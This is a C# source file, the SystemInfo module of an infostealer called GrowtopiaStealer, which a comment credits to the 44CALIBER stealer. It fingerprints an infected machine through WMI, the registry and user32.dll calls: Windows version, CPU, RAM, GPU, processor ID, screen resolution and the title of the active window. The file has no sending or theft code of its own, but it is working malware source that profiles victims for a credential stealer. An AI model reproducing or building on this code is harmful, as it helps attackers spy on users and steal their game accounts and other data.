using Microsoft.Win32;
using System;
using System.Drawing;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;

namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer that code from https://github.com/Khainaaeh/44CALIBER/
{
    class SystemInfo
    {
        public static string GetSystemVersion() // Getting Windows version 
        {
            return GetWindowsVersionName() + " " + GetBitVersion();
        }

        public static string GetWindowsVersionName()// Version Windows
        {
            string sData = "Unknown System";
            try
            {
                using (ManagementObjectSearcher mSearcher = new ManagementObjectSearcher(@"root\CIMV2", " SELECT * FROM win32_operatingsystem"))
                {
                    foreach (ManagementObject tObj in mSearcher.Get())
                        sData = Convert.ToString(tObj["Name"]);
                    sData = sData.Split(new char[] { '|' })[0];
                    int iLen = sData.Split(new char[] { ' ' })[0].Length;
                    sData = sData.Substring(iLen).TrimStart().TrimEnd();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            return sData;
        }
        private static string GetBitVersion() // Getting bits
        {
            try
            {
                if (Registry.LocalMachine.OpenSubKey(@"HARDWARE\Description\System\CentralProcessor\0")
                    .GetValue("Identifier")
                    .ToString()
                    .Contains("x86"))
                    return "(32 Bit)";
                else
                    return "(64 Bit)";
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            return "(Unknown)";
        }

        public static string GetCPUName() // Getting name of CPU
        {
            try
            {
                string CPU = string.Empty;
                ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
                foreach (ManagementObject mObject in mSearcher.Get())
                {
                    CPU = mObject["Name"].ToString();
                }
                return CPU;
            }
            catch (Exception)
            {
                return "Error";
            }
        }

        public static string GetRAM() // Getting RAM
        {
            try
            {
                int RamAmount = 0;
                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
                {
                    foreach (ManagementObject MO in MOS.Get())
                    {
                        double Bytes = Convert.ToDouble(MO["TotalPhysicalMemory"]);
                        RamAmount = (int)(Bytes / 1048576) - 1;
                        break;
                    }
                }
                return RamAmount.ToString() + "MB";
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                return "Error";
            }
        }

        public static string GetProcessorID() //Getting Processor Id
        {
            string sProcessorID = string.Empty;
            ManagementObjectSearcher oManagementObjectSearcher = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor");
            ManagementObjectCollection oCollection = oManagementObjectSearcher.Get();
            foreach (ManagementObject oManagementObject in oCollection)
            {
                sProcessorID = (string)oManagementObject["ProcessorId"];
            }
            return (sProcessorID);
        }
        public static string GetGpuName() // Getting GPU Name
        {
            try
            {
                ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
                foreach (ManagementObject mObject in mSearcher.Get())
                    return mObject["Name"].ToString();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            return "Unknown";
        }
        public static string ScreenMetrics() // Получение разрешение экрана
        {
            Rectangle bounds = System.Windows.Forms.Screen.GetBounds(Point.Empty);
            int width = bounds.Width;
            int height = bounds.Height;
            return width + "x" + height;
        }
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        public static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }
    }
}
